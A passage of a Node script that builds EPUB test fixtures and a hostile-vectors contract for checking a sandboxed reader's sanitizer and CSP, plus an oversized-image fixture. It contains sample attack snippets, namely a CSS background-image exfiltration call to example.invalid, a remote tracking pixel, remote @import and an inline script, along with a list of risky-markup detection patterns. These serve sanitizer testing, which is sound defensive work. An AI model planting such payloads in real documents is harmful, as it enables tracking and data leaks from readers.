    note: 'main.css lives in OEBPS/styles/ and the section in OEBPS/text/. Section.resolve() is section-relative, so the host must compose the reference in relative space (dirname of the link href, joined with the import target) before resolving. Resolving "second.css" straight from the section lands on OEBPS/text/second.css and returns undefined.',
  }),
  vector({
    id: 'css-url-relative-to-stylesheet',
    sectionId: 'resources',
    source: SECOND_CSS,
    expectation: 'preserved',
    selector: '#css-url-image',
    description: 'A url() inside an imported stylesheet pointing at an image that only exists relative to that stylesheet (OEBPS/styles/assets/plate.png).',
    snippet: '.plate { background-image: url("assets/plate.png"); width: 24px; height: 24px; }',
    note: 'The same relative-base trap as css-import-local, one level deeper: the base is second.css, which was itself reached through an @import.',
  }),
  vector({
    id: 'css-font-face-url',
    sectionId: 'resources',
    source: MAIN_CSS,
    expectation: 'preserved',
    selector: '#font-face-text',
    description: 'An @font-face src pointing at a font inside the archive.',
    snippet: '@font-face { font-family: "Hostile Stub"; src: url("../fonts/stub.woff") format("woff"); }',
    note: 'The .woff bytes are a stub, so the face will not render glyphs. What is assertable here is the rewrite and the resolution, not the typography.',
  }),
  vector({
    id: 'inline-style-url',
    sectionId: 'resources',
    source: RESOURCES,
    expectation: 'preserved',
    selector: '#inline-style-url',
    description: 'A url() in an inline style attribute, whose base is the section itself.',
    snippet: '<div id="inline-style-url" style="background-image: url(../images/dot.png); width: 24px; height: 24px;">',
  }),
  vector({
    id: 'css-import-cycle',
    sectionId: 'resources',
    source: CYCLE_A_CSS,
    expectation: 'preserved',
    selector: '#cycle-stylesheet',
    description: 'cycle-a.css imports cycle-b.css. Following @import chains recursively must terminate rather than hang.',
    snippet: '@import url("cycle-b.css");',
  }),
  vector({
    id: 'css-import-cycle-back',
    sectionId: 'resources',
    source: CYCLE_B_CSS,
    expectation: 'preserved',
    description: 'cycle-b.css imports cycle-a.css straight back, closing the cycle.',
    snippet: '@import url("cycle-a.css");',
  }),
  vector({
    id: 'remote-stylesheet',
    sectionId: 'resources',
    source: RESOURCES,
    expectation: 'inert',
    selector: '#remote-stylesheet',
    description: 'A linked stylesheet on a remote origin. Nothing may be fetched.',
    snippet: '<link id="remote-stylesheet" rel="stylesheet" type="text/css" href="https://example.invalid/remote.css"/>',
  }),
  vector({
    id: 'remote-image',
    sectionId: 'resources',
    source: RESOURCES,
    expectation: 'inert',
    selector: '#remote-image',
    description: 'A remote tracking pixel. This one proves the CSP rather than the sanitizer: img-src blob: is what must stop it.',
    snippet: '<img id="remote-image" src="https://example.invalid/pixel.png" alt="A tracking pixel"/>',
  }),
  vector({
    id: 'css-remote-import',
    sectionId: 'resources',
    source: MAIN_CSS,
    expectation: 'inert',
    description: 'An @import of a remote stylesheet.',
    snippet: '@import url(https://example.invalid/x.css);',
  }),
  vector({
    id: 'css-remote-background',
    sectionId: 'resources',
    source: MAIN_CSS,
    expectation: 'inert',
    selector: '#css-remote-background',
    description: 'The CSS-only exfiltration channel: a background image on a remote origin with the payload in the query string.',
    snippet: '.leak { background-image: url(https://example.invalid/?leak=css); }',
  }),
  vector({
    id: 'declared-missing-image',
    sectionId: 'resources',
    source: RESOURCES,
    expectation: 'preserved',
    selector: '#declared-missing-image',
    description: 'An image declared in the manifest whose zip entry was never written; resolve() returns undefined. The element must degrade without throwing and the alt must come back as text, so the sentence reads "Declared in the manifest".',
    snippet: '<img id="declared-missing-image" src="../images/declared-missing.png" alt="D"/>',
  }),
  vector({
    id: 'undeclared-present-image',
    sectionId: 'resources',
    source: RESOURCES,
    expectation: 'preserved',
    selector: '#undeclared-image',
    description: 'An image present in the archive but absent from the manifest. The manifest is the only statement of a media type, so resolve() returns undefined here too - a different failure class with the same graceful outcome, and the sentence must read "Undeclared in the manifest".',
    snippet: '<img id="undeclared-image" src="../images/undeclared-present.png" alt="U"/>',
  }),

  vector({
    id: 'declared-scripted-script',
    sectionId: 'scripted-declared',
    source: SCRIPTED,
    expectation: 'removed',
    probe: '__pwned_declared_scripted',
    description: 'The control for the unconditional-sanitization criterion: the same inline script, in the one section whose manifest item declares properties="scripted". Its treatment must be identical to inline-script in the undeclared section.',
    snippet: '<script>window.__pwned_declared_scripted = 1;</script>',
  }),
];

// Any construct a naive host might execute, load or navigate. Every match has
// to sit inside some vector's snippet, or the manifest has drifted from the
// fixture - which is worse than having no manifest at all.
const RISK_PATTERNS = [
  /<script\b/gi,
  /<iframe\b/gi,
  /<object\b/gi,
  /<embed\b/gi,
  /<base\b/gi,
  /<form\b/gi,
  /<meta\s+http-equiv/gi,
  /<use\b/gi,
  /<foreignObject\b/gi,
  /<animate\b/gi,
  /<set\b/gi,
  /<param\b/gi,
  /\son[a-zA-Z]+\s*=/gi,
  /javascript:/gi,
  /&#\d+;/g,
  /@import/gi,
  /url\(/gi,
  /example\.invalid/gi,
  /<a\b[^>]*\/>/gi,
  /x-ebookmaker-pageno/gi,
];

function checkHostileVectors(entries, vectors) {
  const text = new Map(entries.map((entry) => [entry.name, Buffer.from(entry.data).toString('utf-8')]));
  const spine = [...text.get('OEBPS/content.opf').matchAll(/<itemref idref="([^"]+)"/g)].map((m) => m[1]);
  const ids = new Set();
  const probes = new Set();
  const spans = new Map();

  for (const v of vectors) {
    if (ids.has(v.id)) throw new Error(`duplicate vector id: ${v.id}`);
    ids.add(v.id);
    if (v.probe !== undefined) {
      if (probes.has(v.probe)) throw new Error(`probe ${v.probe} is shared by more than one vector`);
      probes.add(v.probe);
    }
    if (!spine.includes(v.sectionId)) throw new Error(`vector ${v.id} names a section outside the spine: ${v.sectionId}`);
    if (!['removed', 'inert', 'preserved'].includes(v.expectation)) {
      throw new Error(`vector ${v.id} has an unknown expectation: ${v.expectation}`);
    }
    const source = text.get(v.source);
    if (source === undefined) throw new Error(`vector ${v.id} names a file the archive does not carry: ${v.source}`);
    const at = source.indexOf(v.snippet);
    if (at === -1) throw new Error(`vector ${v.id}: snippet is not in ${v.source}`);
    if (source.indexOf(v.snippet, at + 1) !== -1) throw new Error(`vector ${v.id}: snippet is not unique in ${v.source}`);
    if (!spans.has(v.source)) spans.set(v.source, []);
    spans.get(v.source).push([at, at + v.snippet.length]);
  }

  for (const [name, source] of text) {
    if (!/\.(xhtml|svg|css|js)$/.test(name)) continue;
    const covered = spans.get(name) ?? [];
    for (const pattern of RISK_PATTERNS) {
      for (const match of source.matchAll(pattern)) {
        if (!covered.some(([start, end]) => match.index < end && match.index + match[0].length > start)) {
          throw new Error(
            `${name}: ${JSON.stringify(match[0])} at offset ${match.index} is not covered by any vector snippet`,
          );
        }
      }
    }
  }
}

checkHostileVectors(hostileEntries, hostileVectors);

writeFileSync(join(outDir, 'hostile.epub'), buildZip(hostileEntries));

writeFileSync(
  join(outDir, 'hostile-vectors.json'),
  JSON.stringify(
    {
      fixture: 'hostile.epub',
      purpose:
        'The contract the sandboxed content host is tested against. Every construct in hostile.epub appears here, and every entry here appears in hostile.epub; make-epub-fixtures.mjs fails to write either file if that stops being true.',
      fields: {
        id: 'Stable name for the vector.',
        sectionId: 'Section (spine item id) that surfaces it.',
        source: 'Zip entry the snippet literally appears in - the section document itself, or a stylesheet it pulls in.',
        expectation:
          'removed: must not survive into the rendered document. inert: may survive structurally but must not execute or navigate. preserved: MUST survive; removing it is a bug.',
        probe: 'Global name a test asserts never appears. Unique per vector, so one failure cannot mask another.',
        selector: 'Where present, a CSS selector for the element in the rendered document.',
        snippet: 'The exact text in `source`, used to prove this list and the fixture agree.',
        note: 'Anything about the vector that is not obvious from the markup.',
      },
      sections: [
        {
          id: 'attacks',
          path: 'OEBPS/text/attacks.xhtml',
          scriptedDeclared: false,
          purpose: 'HTML script execution, navigation and embedding vectors, in head and body.',
        },
        {
          id: 'svg-attacks',
          path: 'OEBPS/text/svg-attacks.xhtml',
          scriptedDeclared: false,
          purpose: 'Inline SVG: a separate parsing context with its own script element, its own handler surface, xlink attributes, foreignObject and SMIL.',
        },
        {
          id: 'svg-document',
          path: 'OEBPS/text/hostile.svg',
          scriptedDeclared: false,
          purpose: 'A spine item that is itself image/svg+xml, so the section document has no HTML wrapper at all.',
        },
        {
          id: 'malformed',
          path: 'OEBPS/text/malformed.xhtml',
          scriptedDeclared: false,
          purpose: 'Not well-formed XML on purpose: the text/html fallback path, plus the parser-confusion and encoding tricks that only exist there.',
        },
        {
          id: 'preserve',
          path: 'OEBPS/text/preserve.xhtml',
          scriptedDeclared: false,
          purpose: 'What a careless sanitizer breaks: zero-width page anchors, a self-closing non-void tag, an unresolvable drop-cap image, and ordinary structural markup.',
        },
        {
          id: 'resources',
          path: 'OEBPS/text/resources.xhtml',
          scriptedDeclared: false,
          purpose: 'Resource loading and the exfiltration channels: blob-rewritable references, an @import chain and cycle, and remote references that prove the CSP.',
        },
        {
          id: 'scripted-declared',
          path: 'OEBPS/text/scripted-declared.xhtml',
          scriptedDeclared: true,
          purpose: 'The only section declaring properties="scripted". It exists so the pair proves sanitization does not branch on the declaration.',
        },
      ],
      unconditionalSanitization:
        'Every attack vector except declared-scripted-script sits in a section whose manifest item does NOT declare properties="scripted". Section.scripted is an author declaration, not a detection, so a fixture that carried its attacks only behind the declaration could not prove that sanitization is unconditional. The one declared section carries the identical inline script for A/B comparison.',
      vectors: hostileVectors,
    },
    null,
    2,
  ) + '\n',
);

// --- oversized image fixture ------------------------------------------------
//
// One chapter with an image whose intrinsic size (2400x1600) dwarfs any reading
// column, so an uncapped <img> would overflow its column and push content off the
// page. The frame reset caps replaced content at max-width:100%; height:auto, and
// this fixture is what proves the cap holds. It also drives the tap-to-zoom overlay.

const bigImageOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:7c9e1f22-4a55-4c3e-9a77-0f2b8c1de777</dc:identifier>
    <dc:title>The Wide Plate</dc:title>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="c1" href="chapter-1.xhtml" media-type="application/xhtml+xml"/>
    <item id="plate" href="plate.png" media-type="image/png"/>
    <item id="style" href="style.css" media-type="text/css"/>
  </manifest>
  <spine>
    <itemref idref="c1"/>
  </spine>
</package>
`;

const bigImageNav = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>The Wide Plate</title></head>
<body>
<nav epub:type="toc"><ol><li><a href="chapter-1.xhtml">The Wide Plate</a></li></ol></nav>
</body>
</html>
`;

const bigImageChapter = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>The Wide Plate</title><link rel="stylesheet" type="text/css" href="style.css"/></head>
<body>
<h1>The Wide Plate</h1>
<p>Below sits a plate far wider than any reading column. It must be capped to the column, never allowed to overflow.</p>
<p><img id="wide-plate" src="plate.png" alt="A very wide invented plate" width="2400" height="1600"/></p>
<p>This paragraph follows the plate and must remain on the page beside it, not pushed off by an overflowing image.</p>
</body>
</html>
`;

writeFileSync(
  join(outDir, 'bigimage.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'content.opf', data: bigImageOpf },
    { name: 'nav.xhtml', data: bigImageNav },
    { name: 'chapter-1.xhtml', data: bigImageChapter },
    { name: 'plate.png', data: makeSolidPng(2400, 1600, 40, 90, 160), method: 0 },
    { name: 'style.css', data: styleCss },
  ]),
);

console.log('fixtures written to', outDir);
